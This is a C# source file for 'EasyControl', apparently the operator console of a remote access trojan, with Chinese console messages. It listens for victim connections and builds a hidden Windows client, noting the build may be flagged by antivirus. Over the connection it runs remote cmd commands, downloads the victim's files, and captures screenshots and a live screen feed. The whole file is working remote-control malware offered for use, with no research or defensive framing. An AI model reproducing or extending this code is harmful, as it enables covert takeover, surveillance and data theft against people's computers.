using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Net;
using System.Net.Sockets;
using System.IO;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Threading;
using System.Drawing;
using System.Windows.Forms;

namespace EasyControl
{
    class Program
    {
        public static bool isListen = false;
        static void Main(string[] args)
        {
            Help("all");
            while (true)
            {
                string Command = Console.ReadLine();
                Command = Command.ToLower();
                string[] Command_Array = Regex.Split(Command, " ");
                switch (Command_Array[0])
                {
                    case "help":
                        Help("all");
                        break;
                    case "listen":
                        try
                        {
                            IPAddress ip = IPAddress.Parse(Command_Array[1]);
                            int port = int.Parse(Command_Array[2]);
                            Listen(ip, port);
                        }
                        catch { Help("listen"); }
                        break;
                    case "generate":
                        try
                        {
                            Generate(Command_Array[1], Command_Array[2]);
                        }
                        catch { Help("generate"); }
                        break;
                    default:
                        Console.WriteLine("语法错误 有问题? 使用 help all 查看帮助");
                        break;
                }

            }
        }
        static void Generate(string outputname,string platform)
        {
            Console.WriteLine("注意，你正在使用程序自带编译函数...");
            Console.WriteLine("可能被杀软查杀标记...");
            Console.WriteLine("建议使用其他编译工具编译EasyControlClient.cs");
            Console.WriteLine("编译中...");
            Thread.Sleep(1000);
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();

            parameters.GenerateExecutable = true;
            parameters.IncludeDebugInformation = true;
            parameters.OutputAssembly = outputname;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.CompilerOptions = "/debug /target:winexe /optimize+ /define:DEBUG /win32icon:icon.ico /platform:" + platform;

            CompilerResults results = provider.CompileAssemblyFromFile(parameters, "EasyControlClient.cs");
            if (results.Errors.HasErrors)
            {
                Console.WriteLine("编译错误：");
                foreach (CompilerError error in results.Errors)
                {
                    Console.WriteLine(error.ErrorText);
                }
            }
            else
            {
                Console.WriteLine("编译成功！");
                File.Delete(outputname.Replace(".exe","") + ".pdb");
            }
        }
        static void Control(Socket s)
        {
            if (s.Connected)
            {
                Console.WriteLine("进入控制模式...");
            }
            while (s.Connected)
            {
                try
                {
                    string send_command = Console.ReadLine();
                    switch ((Regex.Split(send_command, " "))[0])
                    {
                        case "screenshot":
                            s.Send(Encoding.Default.GetBytes(send_command));
                            byte[] Array = new byte[2048000];
                            int length = s.Receive(Array);
                            string filename = GetAppKeyString(5);
                            FileStream fs = File.Create(filename + ".jpg");
                            fs.Write(Array, 0, length);
                            fs.Close();
                            Console.WriteLine("保存图片：" + filename + ".jpg");
                            Console.WriteLine("Image Save Completed!");
                            Process.Start(filename + ".jpg");
                            break;
                        case "screenshare":
                            s.Send(Encoding.Default.GetBytes(send_command));
                            Thread formThread = new Thread(() =>
                            {
                                try
                                {
                                    Console.WriteLine("正在启动屏幕监控...");
                                    MainForm form = new MainForm();
                                    form.FormClosed += (sender, e) =>
                                    {
                                        s.Send(Encoding.Default.GetBytes("1"));
                                        Application.ExitThread();
                                    };
                                    form.Show();
                                    Application.Run();
                                    Console.WriteLine("启动完成...");
                                    Console.WriteLine("关闭窗口 退出 监控模式...");
                                }
                                catch { return; }

                            });
                            Thread updataimage = new Thread(() =>
                            {
                                byte[] Array_ = new byte[2048000];
                                int length_;
                                while (true)
                                {
                                    try
                                    {
                                        s.Send(Encoding.Default.GetBytes("0"));
                                        length_ = s.Receive(Array_);
                                        using (MemoryStream memoryStream = new MemoryStream(Array_))
                                        {
                                            Image image = Image.FromStream(memoryStream);
                                            MainForm.UpdateImage(image);
                                        }
                                    }
                                    catch { return; }
                                }
                            });
                            formThread.Start();
                            updataimage.Start();
                            updataimage.Join();
                            formThread.Join();
                            break;
                        case "download":
                            s.Send(Encoding.Default.GetBytes(send_command));
                            byte[] Array__ = new byte[51200000];
                            int length__ = s.Receive(Array__);
                            string filename__ = (Regex.Split(send_command, " "))[2];
                            FileStream fs__ = File.Create(filename__);
                            fs__.Write(Array__, 0, length__);
                            fs__.Close();
                            Console.WriteLine("Download Completed!");
                            break;
                        case "help":
                            Help("all");
                            break;
                        default:
                            s.Send(Encoding.Default.GetBytes(send_command));
                            string result = GetRequest(s);
                            Console.WriteLine(result);
                            break;
                    }
                }
                catch 
                {
                    Console.WriteLine("远程主机强迫关闭了连接");
                    s.Close();
                    Console.WriteLine("已退出控制模式...");
                }
            }
        }
        static void Listen(IPAddress ip,int port)
        {
            try
            {
                TcpListener myList = new TcpListener(ip, port);
                myList.Start();
                Console.WriteLine("开启监听：" + myList.LocalEndpoint);
                Socket s = myList.AcceptSocket();
                if (s.Connected)
                {
                    Console.WriteLine("连接来自 " + s.RemoteEndPoint);
                    Control(s);
                }
                myList.Stop();
                Console.WriteLine(myList.LocalEndpoint + " 监听已关闭");
            }
            catch { Console.WriteLine("当前端口无法建立监听，可能被占用"); }
        }
        static string GetRequest(Socket s)
        {
            byte[] Array = new byte[4096000];
            int length = s.Receive(Array);
            string result = Encoding.Default.GetString(Array, 0, length);
            return result;
        }
        static void Help(string position)
        {
            switch (position)
            {
                case "all":
                    Console.WriteLine("-------------------EasyControl-------------------");
                    Console.WriteLine("- 欢迎使用EasyControl  by:FoRever               -");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("- 指令：                                        -");
                    Console.WriteLine("- listen [ip] [端口] 监听目标ip端口             -");
                    Console.WriteLine("- generate [name] [x86/x64] 生成被控端(不推荐)  -");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("- 控制模式指令：                                -");
                    Console.WriteLine("- cmd [cmd命令] 执行cmd指令                     -");
                    Console.WriteLine("- webdownload [url] [savename] 下载目标url文件  -");
                    Console.WriteLine("- download [filename] [savename] 下载目标文件   -");
                    Console.WriteLine("- screenshot 截图                               -");
                    Console.WriteLine("- screenshare 屏幕监控                          -");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("-------------------------------------------------");
                    break;
                case "listen":
                    Console.WriteLine("-------------------EasyControl-------------------");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("- listen [ip] [端口] 监听目标ip端口             -");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("-------------------------------------------------");
                    break;
                case "generate":
                    Console.WriteLine("-------------------EasyControl-------------------");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("- generate [name] [x86/x64] 生成被控端(不推荐)  -");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("-------------------------------------------------");
                    break;
                case "control":
                    Console.WriteLine("-------------------EasyControl-------------------");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("- 控制模式指令：                                -");
                    Console.WriteLine("- cmd [cmd命令] 执行cmd指令                     -");
                    Console.WriteLine("- webdownload [url] [savename] 下载目标url文件  -");
                    Console.WriteLine("- download [filename] [savename] 下载目标文件   -");
                    Console.WriteLine("- screenshot 截图                               -");
                    Console.WriteLine("- screenshare 屏幕监控                          -");
                    Console.WriteLine("-                                               -");
                    Console.WriteLine("-------------------------------------------------");
                    break;
            }
        }
        static string GetAppKeyString(int length)
        {
            StringBuilder result = new StringBuilder();
            string pool = "0123456789abcdefghijklnmopqrstuvwxyz";
            Random random = new Random();
            while (result.Length < length)
            {
                result.Append(pool[random.Next(0, pool.Length - 1)]);
            }
            return result.ToString();
        }
    }
}
